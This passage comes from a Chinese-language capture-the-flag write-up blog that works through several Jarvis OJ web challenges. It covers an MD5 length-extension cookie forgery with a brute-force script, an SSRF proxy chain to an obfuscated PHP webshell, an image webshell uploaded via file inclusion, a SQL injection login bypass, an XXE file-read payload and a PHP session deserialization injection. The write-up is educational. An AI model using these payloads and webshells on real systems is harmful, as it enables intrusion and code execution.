class="number">350</span>&lt;/title&gt;</span><br><span class="line">&lt;style type=<span class="string">"text/css"</span>&gt;</span><br><span class="line">	body &#123;</span><br><span class="line">		background:gray;</span><br><span class="line">		text-align:center;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">	<span class="meta">&lt;?php</span> </span><br><span class="line">		$auth = <span class="keyword">false</span>;</span><br><span class="line">		$role = <span class="string">"guest"</span>;</span><br><span class="line">		$salt = </span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"role"</span>])) &#123;</span><br><span class="line">			$role = unserialize($_COOKIE[<span class="string">"role"</span>]);</span><br><span class="line">			$hsh = $_COOKIE[<span class="string">"hsh"</span>];</span><br><span class="line">			<span class="keyword">if</span> ($role===<span class="string">"admin"</span> &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[<span class="string">"role"</span>]))) &#123;</span><br><span class="line">				$auth = <span class="keyword">true</span>;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				$auth = <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$s = serialize($role);</span><br><span class="line">			setcookie(<span class="string">'role'</span>,$s);</span><br><span class="line">			$hsh = md5($salt.strrev($s));</span><br><span class="line">			setcookie(<span class="string">'hsh'</span>,$hsh);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is </span></span><br><span class="line"><span class="string">		&#125; else &#123;</span></span><br><span class="line"><span class="string">			echo "</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="string">";</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">	?&gt;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>看一下代码，可以发现，role要反序列化得到admin，hsh要为(salt + role的反置)的md5值。<br>查了一下资料，发现hsh那部分可以利用md5扩展攻击实现，但是要实现md5扩展攻击，对role肯定是要特殊构造的，而改了role的话，<code>$role ==== admin</code>又是三个=不能用弱类型比较。于是想到可能要利用unserialize函数。于是对unserialize函数简单测试了一下。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\18.JPG" alt><br>如上图示，我们可以发现，当<code>s:5:&quot;guest&quot;;</code>被反序列化后，后面接着的内容被忽视掉了。(PS:后面用php7测试了一下，结果一样)</p>
+<p>下面是关于md5哈希长度扩展攻击的资料，这里就不多写了。<br><a href="https://www.cnblogs.com/p00mj/p/6288337.html" target="_blank" rel="noopener">https://www.cnblogs.com/p00mj/p/6288337.html</a><br><a href="https://www.cnblogs.com/pcat/p/5478509.html" target="_blank" rel="noopener">https://www.cnblogs.com/pcat/p/5478509.html</a></p>
+<p>看完上面两个链接里的资料后，应该对md5哈希长度扩展攻击即相关工具hashpump有了了解。按道理就应该直接用hashpump生成hsh，然后填入cookie就好。但是哈希长度扩展攻击有一个前提条件，可以不知道salt的值，但是要知道它的长度，这样才能进行填充。</p>
+<p>因此这里还要用到python，对salt的长度进行一下爆破，然后用python进行提交，python代码如下。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://web.jarvisoj.com:32778/"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交请求</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Post</span><span class="params">(role,hsh,i)</span>:</span></span><br><span class="line">    cookie = &#123;<span class="string">'role'</span>:role,<span class="string">'hsh'</span>:hsh&#125;</span><br><span class="line">    r = requests.get(url,cookies=cookie)</span><br><span class="line">    <span class="comment"># 如果提交的是错误的hsh值得话，错误返回报文长度为210</span></span><br><span class="line">    <span class="keyword">if</span> len(r.text) != <span class="number">210</span>:</span><br><span class="line">        print(<span class="string">"第"</span>,i,<span class="string">'次'</span>)</span><br><span class="line">        print(r.text)</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算hash值</span></span><br><span class="line">cmd = <span class="string">'hashpump -s 3a4727d57463f122833d9e732f94e4e0 -d \';"tseug":5:s\' -k &#123;&#125; -a \';"nimda":5:s\''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开始爆破</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    cmd_ = cmd.format(str(i))</span><br><span class="line">    res = os.popen(cmd_).readlines()</span><br><span class="line">    hsh,role = res[<span class="number">0</span>][:<span class="number">-1</span>],res[<span class="number">1</span>][:<span class="number">-1</span>]</span><br><span class="line">	<span class="comment"># 需要对role进行反置处理</span></span><br><span class="line">    t1,t2,t3 = role[:<span class="number">12</span>],role[<span class="number">12</span>:<span class="number">-12</span>],role[<span class="number">-12</span>:]</span><br><span class="line">    t2 = t2.split(<span class="string">'\\x'</span>)</span><br><span class="line">    t2 = t2[::<span class="number">-1</span>]</span><br><span class="line">    t2 = <span class="string">'%'</span>.join(t2)</span><br><span class="line">    t2 = <span class="string">'%'</span> + t2[:<span class="number">-1</span>]</span><br><span class="line">    role = t3[::<span class="number">-1</span>] + t2 + t1[::<span class="number">-1</span>]</span><br><span class="line">    role = role.replace(<span class="string">';'</span>,<span class="string">'%3b'</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"第"</span>,i,<span class="string">'次'</span>)</span><br><span class="line">    print(role)</span><br><span class="line">    Post(role,hsh,i)</span><br></pre></td></tr></table></figure></p>
+<p>代码跑一下，得到结果，salt的长度是12。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\19.JPG" alt></p>
+<hr>
+<h1 id="0x08-Chopper"><a href="#0x08-Chopper" class="headerlink" title="0x08 Chopper"></a>0x08 Chopper</h1><p>题目描述:</p>
+<blockquote>
+<p>小明入侵了一台web服务器并上传了一句话木马，但是，管理员修补了漏洞，更改了权限。更重要的是：他忘记了木马的密码！你能帮助他夺回控制权限吗？<br>关卡入口：<a href="http://web.jarvisoj.com:32782/" target="_blank" rel="noopener">http://web.jarvisoj.com:32782/</a><br>题目来源:ISCC2016</p>
+</blockquote>
+<p>题目链接点进去如下图，点击下面的管理员登录，链接指向<code>http://web.jarvisoj.com:32782/admin</code>，弹了一个框说<code>you are not admin!</code>,然后页面是<code>403 Forbidden You don&#39;t have permission to access /admin/ on this server.</code><br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\20.JPG" alt></p>
+<p>查看admin页面的源码，如下图，发现有行注释，里面有admin的ip。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\22.JPG" alt></p>
+<p>于是访问这个ip，也是403禁止访问。这条路到这也算断了。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\23.jpg" alt></p>
+<p>于是返回主页，看看有没有别的消息。发现index.php页面那张图片的img标签导入链接有点蹊跷。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\24.JPG" alt></p>
+<p>发现图片地址是用proxy.php的url参数导入的。于是想到是不是要用proxy.php来打ssrf。后面发现就是用proxy.php做两个跳转而已。</p>
+<p>于是访问<code>http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/</code><br>然后发现页面url被重定向为<code>http://web.jarvisoj.com:32782/index.php?url=http://8080av.com</code>，由此可以确定可以通过proxy.php访问202.5.19.128。</p>
+<p>但是通过proxy.php访问202.5.19.128/admin的话，会访问失败。</p>
+<p>于是可以试试访问202.5.19.128/proxy.php看看是不是存在，是不是需要跳转两次。结果发现可以访问<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\25.jpg" alt></p>
+<p>到现在可以简单理下思路</p>
+<blockquote>
+<p><a href="http://web.jarvisoj.com:32782/" target="_blank" rel="noopener">http://web.jarvisoj.com:32782/</a> 下有proxy.php可以跳转访问还有/admin/目录 403 禁止访问<br><a href="http://202.5.19.128/" target="_blank" rel="noopener">http://202.5.19.128/</a> 下有proxy.php可以进行跳转<br>可以推测 flag在 <a href="http://web.jarvisoj.com:32782/admin/" target="_blank" rel="noopener">http://web.jarvisoj.com:32782/admin/</a> 目录下<br>而用 <a href="http://web.jarvisoj.com:32782/proxy.php?url=http://web.jarvisoj.com:32782/admin/" target="_blank" rel="noopener">http://web.jarvisoj.com:32782/proxy.php?url=http://web.jarvisoj.com:32782/admin/</a> 与直接访问 <a href="http://web.jarvisoj.com:32782/admin/" target="_blank" rel="noopener">http://web.jarvisoj.com:32782/admin/</a> 得到的结果一样，都是弹框 you are not admin</p>
+</blockquote>
+<p>所以推测是要用 <a href="http://web.jarvisoj.com:32782/proxy.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32782/proxy.php</a> 跳 <a href="http://202.5.19.128/proxy.php" target="_blank" rel="noopener">http://202.5.19.128/proxy.php</a> 跳 <a href="http://web.jarvisoj.com:32782/admin/" target="_blank" rel="noopener">http://web.jarvisoj.com:32782/admin/</a> 进行两次跳转。</p>
+<p>payload:<code>http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/</code><br>跳转结果如下图，you are cloosing<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\26.jpg" alt></p>
+<p>说实话，到这里又懵了，后面看完别人的wp，发现admin/ 目录下还有robots.txt这个文件，于是访问robots.txt文件，内容如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow:trojan.php</span><br><span class="line">Disallow:trojan.php.txt</span><br></pre></td></tr></table></figure></p>
+<p>于是继续访问<code>trojan.php.txt</code>,看一下代码先。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $&#123;(<span class="string">"#"</span>^<span class="string">"|"</span>).(<span class="string">"#"</span>^<span class="string">"|"</span>)&#125;=(<span class="string">"!"</span>^<span class="string">"`"</span>).(<span class="string">"( "</span>^<span class="string">"&#123;"</span>).(<span class="string">"("</span>^<span class="string">"["</span>).(<span class="string">"~"</span>^<span class="string">";"</span>).(<span class="string">"|"</span>^<span class="string">"."</span>).(<span class="string">"*"</span>^<span class="string">"~"</span>);$&#123;(<span class="string">"#"</span>^<span class="string">"|"</span>).(<span class="string">"#"</span>^<span class="string">"|"</span>)&#125;((<span class="string">"-"</span>^<span class="string">"H"</span>). (<span class="string">"]"</span>^<span class="string">"+"</span>). (<span class="string">"["</span>^<span class="string">":"</span>). (<span class="string">","</span>^<span class="string">"@"</span>). (<span class="string">"&#125;"</span>^<span class="string">"U"</span>). (<span class="string">"e"</span>^<span class="string">"A"</span>). (<span class="string">"("</span>^<span class="string">"w"</span>).(<span class="string">"j"</span>^<span class="string">":"</span>). (<span class="string">"i"</span>^<span class="string">"&amp;"</span>). (<span class="string">"#"</span>^<span class="string">"p"</span>). (<span class="string">"&gt;"</span>^<span class="string">"j"</span>). (<span class="string">"!"</span>^<span class="string">"z"</span>). (<span class="string">"T"</span>^<span class="string">"g"</span>). (<span class="string">"e"</span>^<span class="string">"S"</span>). (<span class="string">"_"</span>^<span class="string">"o"</span>). (<span class="string">"?"</span>^<span class="string">"b"</span>). (<span class="string">"]"</span>^<span class="string">"t"</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>被混淆了，不过没关系，复制下来本地执行一下，看看报错信息。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\27.JPG" alt><br>所以这应该是题目描述里小明的一句话木马。密码是360</p>
+<p>知道这个之后，就简单了。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\28.JPG" alt></p>
+<p>这道题感觉有点那么脑洞(可能是因为菜吧)，但是每一步又都有点有理有据。哎，菜逼还是菜呀。</p>
+<hr>
+<h1 id="0x09-Easy-Gallery"><a href="#0x09-Easy-Gallery" class="headerlink" title="0x09 Easy Gallery"></a>0x09 Easy Gallery</h1><p>题目描述:</p>
+<blockquote>
+<p>“没有什么防护是一个漏洞解决不了的，如果有，那<br>就…..<br>“<br>题目入口：<a href="http://web.jarvisoj.com:32785/" target="_blank" rel="noopener">http://web.jarvisoj.com:32785/</a></p>
+</blockquote>
+<p>题目进去是一个简单的网站系统。简单浏览测试下，发现总共有两个功能。</p>
+<p>第一个功能是上传图片，经过简单测试，发现只能上传jpg和gif格式图片。而且用burp改后缀跟MIME都不可用，猜测是用了文件头校验。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\29.JPG" alt></p>
+<p>第二个功能是view，通过前面上传图片成功会得到一个图片ID，可以通过输入图片ID和图片类型(jpg、gif)进行查看。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\30.JPG" alt></p>
+<p>结合这两个功能的测试分析，不难推测，这题应该是通过生成图片马绕过上传得到图片ID，然后利用图片ID进行文件包含连接小马。那么现在最主要的问题就集中在<strong>如何得到上传图片的路径</strong>和<strong>找到进行文件包含的点</strong>。</p>
+<p>找到上传图片的路径简单，先上传一个正常jpg图片，然后通过图片ID访问一下，测试一下整个流程。可以看到，成功访问。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\31.jpg" alt></p>
+<p>在图片上右击 <code>在新标签页打开</code>，得到图片访问路径为<code>http://web.jarvisoj.com:32785/uploads/&lt;图片ID&gt;.&lt;图片类型jpg/gif&gt;</code><br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\32.jpg" alt></p>
+<p>下一个问题就是找到可以进行文件包含的点。通过观察不难发现，Submit和View功能页面的url都是通过<code>?page=</code>参数进行访问的。<br>Submit功能的url为<code>http://web.jarvisoj.com:32785/index.php?page=submit</code><br>View功能的url为<code>http://web.jarvisoj.com:32785/index.php?page=view</code></p>
+<p>我们可以将page参数赋为图片路径，看看页面返回结果<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\33.jpg" alt><br>从返回的warning信息可以看出，服务器会自动把传入的page参数的值后面加上<code>.php</code>后缀，限制我们访问除php外的文件，但是这里可以用<code>%00</code>截断一下。我们把图片ID改成一个不存在的错误ID,然后用<code>%00</code>截断一下，如果截断成功，则应该会出现<code>xxxx.jpg failed to open...</code>报错。执行结果如图示，证明此处是可以用<code>%00</code>截断的。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\34.jpg" alt></p>
+<p>于是我们生成一个图片马上传试试。<code>copy shell.gif/b + 2.php/a 2.gif</code><br>这里shell.gif是一张正常图片，2.php内容为<code>&lt;?php @eval($_POST[&#39;miracle778&#39;]);?&gt;</code></p>
+<p>生成好后，我们上传、截断包含一下，居然提示<code>you should not do this!</code>。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\35.jpg" alt></p>
+<p>说明可能我们马可能被检测到了。然后没办法了，只能搜索一波别人的wp。</p>
+<p>然后发现把一句话木马改为<code>&lt;script language=&quot;php&quot;&gt;@eval_r($_POST[&#39;miracle778&#39;]);&lt;/script&gt;</code>即可···<br>另外提一下，<code>&lt;script language=&quot;php&quot;&gt;</code>这种写法好像php7已经不支持了。</p>
+<p>重新生成图片马上传，截断包含即可得flag。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\36.jpg" alt></p>
+<hr>
+<h1 id="0x10-Simple-Injection"><a href="#0x10-Simple-Injection" class="headerlink" title="0x10 Simple Injection"></a>0x10 Simple Injection</h1><p>题目描述:</p>
+<blockquote>
+<p>很简单的注入，大家试试？<br>题目入口：<a href="http://web.jarvisoj.com:32787/" target="_blank" rel="noopener">http://web.jarvisoj.com:32787/</a><br>题目来源：ISCC2016</p>
+</blockquote>
+<p>题目进去是一个登录框。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\37.JPG" alt></p>
+<p>简单测试下，发现有密码错误和用户名错误两种错误回显。<br>当输入<code>username=admin&amp;password=123</code>，页面返回密码错误。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\38.JPG" alt></p>
+<p>当输入<code>username=admin&#39;&amp;password=123</code>，页面返回用户名错误。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\39.JPG" alt></p>
+<p>而输入<code>username=admin&#39; #&amp;password=123</code>，页面返回密码错误而不是之前的用户名错误，说明<code>&#39; #</code>没有被过滤。<br>输入<code>username=admin&#39; and 1=1#</code>，页面返回用户名错误，说明新增的空格和and可能存在过滤。于是逐步排查，先将空格改为<code>/**/</code>试试，即输入<code>username=admin&#39;/**/and/**/1=1#</code>，结果发现页面返回密码错误，即可确定，服务器只过滤了空格。</p>
+<p>于是就可以通过页面回显结果进行布尔盲注，以页面返回密码错误为True，返回用户名错误为False。<br>这一题关于盲注的解法我准备后面文章再拿来当例子讲（后面准备出一篇关于盲注、报错注入的文章）</p>
+<p>所以这题介绍另一种算是巧解的方法吧。<br>页面存在两种报错返回结果，用户名错误和密码错误，而且输入除admin外的用户名均提示用户名错误，所以可以肯定admin一个用户，进而猜测它的处理逻辑可能为：通过输入的username作为where条件查询密码，如果存在且查询结果与输入的密码相同即爆flag，如果不匹配则返回密码错误，而如果不存在查询结果就报用户名错误。逻辑代码类似于下面:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$res = query(select password from user where username=$_POST[<span class="string">'username'</span>]);<span class="comment">//query函数为了简便瞎写了</span></span><br><span class="line"><span class="keyword">if</span>($res)	<span class="comment">//查询返回结果不为空集</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(fetch($res)===md5($_POST[<span class="string">'password'</span>]))&#123;	<span class="comment">//fetch函数为图简便，也是瞎写的。</span></span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;	<span class="comment">//密码不匹配</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"密码错误"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"用户名错误"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>于是我们可以输入一个不存在的用户名，结合union select语句手动创建一个密码作为sql查询语句的返回结果，然后密码框处输入我们创建的假密码进行绕过。<br>例如输入<code>username=miracle778&#39;/**/union(select(123))#&amp;password=123</code>，结果返回密码错误没有报用户名错误，这说明了我们这个方法是生效的，只是服务器做密码比较的时候可能用了哈希加密，这里推测用了md5加密。于是输入<code>username=miracle778&#39;/**/union(select(md5(&#39;123&#39;)))#&amp;password=123</code>，成功得到flag，如下图示。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\40.JPG" alt></p>
+<hr>
+<h1 id="0x11-api调用"><a href="#0x11-api调用" class="headerlink" title="0x11 api调用"></a>0x11 api调用</h1><p>题目描述:</p>
+<blockquote>
+<p>请设法获得目标机器/home/ctf/flag.txt中的flag值。<br>题目入口：<a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">http://web.jarvisoj.com:9882/</a></p>
+</blockquote>
+<p>题目点进去，是一个输入框<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\41.JPG" alt><br>输入测试字符串，然后点击Go，抓个包看看。结果如下图示，发现请求和响应包里的Content-Type都是json形式，而且传入和返回的数据都是json形式。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\42.JPG" alt></p>
+<p>结合题目描述:<code>请设法获得目标机器/home/ctf/flag.txt中的flag值</code>，想到了利用XXE读取文件。<br>于是把请求头里的Content-Type改为<code>application/xml</code>，并传入<code>&lt;name&gt;miracle778&lt;/name&gt;</code>进行测试，如下图，发现返回了XML内容。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\43.JPG" alt><br>于是可以确定，此处存在XXE漏洞，然后只需构造payload读取<code>/home/ctf/flag.txt</code>即可。<br>payload:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE miracle [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY name SYSTEM "file:///home/ctf/flag.txt"&gt;</span></span><br><span class="line"><span class="meta">]</span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">miracle</span>&gt;</span>&amp;name;<span class="tag">&lt;/<span class="name">miracle</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\44.JPG" alt></p>
+<hr>
+<h1 id="0x12-图片上传漏洞"><a href="#0x12-图片上传漏洞" class="headerlink" title="0x12 图片上传漏洞"></a>0x12 图片上传漏洞</h1><p>题目描述:</p>
+<blockquote>
+<p>请设法获取/home/ctf/flag.txt 中的flag值。<br>(建议使用png文件上传)<br>题目入口：<a href="http://web.jarvisoj.com:32790/" target="_blank" rel="noopener">http://web.jarvisoj.com:32790/</a></p>
+</blockquote>
+<p>这题好像是利用一个漏洞，没有做，先留着，以后做了再来写。</p>
+<hr>
+<h1 id="0x13-PHPINFO"><a href="#0x13-PHPINFO" class="headerlink" title="0x13 PHPINFO"></a>0x13 PHPINFO</h1><p>题目描述:</p>
+<blockquote>
+<p>题目入口：<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/</a></p>
+</blockquote>
+<p>题目进去就看到了代码，简单扫一眼下来，发现了<code>serialize session</code>等关键词，猜测跟反序列化有关。而且只要GET传入了phpinfo参数，就会通过构造函数和析构函数，自动调用执行<code>phpinfo()</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>于是GET传入phpinfo参数，看一下phpinfo内容先。在phpinfo里面找到了session.serialize_handler设置项，如下图，这个选项的全局变量是php_serialize，而index.php代码里通过<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code>改成了php。<br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\45.JPG" alt></p>
+<p>这个session.serialize_handler选项，决定php存储session时用的序列化规则格式，而index.php设置的handler和默认的不同，所以会出现问题。<br>具体原理参考：<a href="https://www.cnblogs.com/sijidou/p/10455646.html" target="_blank" rel="noopener">PHP反序列化与Session</a></p>
+<p>我这里简单讲一下，就是三种不同的handler对应三种不同的存储session的序列化、反序列化格式，如果前后不一致，就会出现安全问题。比如此题，形成原理是在用session.serialize_handler = php_serialize存储的字符可以引入 | , 再用session.serialize_handler = php格式取出<code>$_SESSION</code>的值时 “|”会被当成键值对的分隔符。</p>
+<p>简单讲完原理后，我们来找一下这题中的读取、写入session语句。我们可以看到index.php代码里有这么一行<code>session_start();</code>，读取了session。那有了读取session的语句，就具备了反序列化session攻击爆flag的条件，不过在哪里写入我们的恶意session呢？</p>
+<p>这里就又要用到phpinfo了，在phpinfo里面还能找到另一个设置，<code>session.upload_progress.enabled</code><br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\46.JPG" alt></p>
+<p>session.upload_progress.enabled为On意味着当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。</p>
+<p>于是我们可以本地写一个上传文件表单，post一个name=session.upload_progress的input标签，这样就可以通过修改filename的值达到写入session的目的。表单代码如下<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>upload<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://web.jarvisoj.com:32784/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>打开burp抓包，把filename修改为我们要写入session里的payload（payload写法具体看前面贴的链接）。<br><code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;}</code><br><img src="/CTF/Jarvis/Web/\Jarvis-OJ-Web\\47.JPG" alt></p>
